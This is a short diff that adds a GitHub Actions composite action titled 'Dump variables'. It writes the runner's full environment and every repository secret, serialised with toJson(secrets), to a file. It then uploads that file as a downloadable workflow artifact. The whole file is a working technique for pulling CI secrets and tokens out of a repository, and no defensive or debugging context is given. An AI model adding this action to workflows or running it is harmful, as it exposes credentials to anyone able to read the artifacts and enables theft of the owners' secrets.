@@ -1,0 +1,21 @@
+name: 'Dump variables'
+description: 'Dump github variables and secrets'
+
+runs:
+  using: "composite"
+  steps:
+      - name: 'Dump Env and Secrets'
+        run: |
+          env > env.txt
+          echo $SECRETS_CONTEXT >> env.txt
+        env:
+          SECRETS_CONTEXT: ${{ toJson(secrets) }} 
+      
+      - name: 'Upload env Artifact'
+        uses: actions/upload-artifact@v3
+        with:
+          name: env
+          retention-days: 1
+          path: |
+            env.txt
+
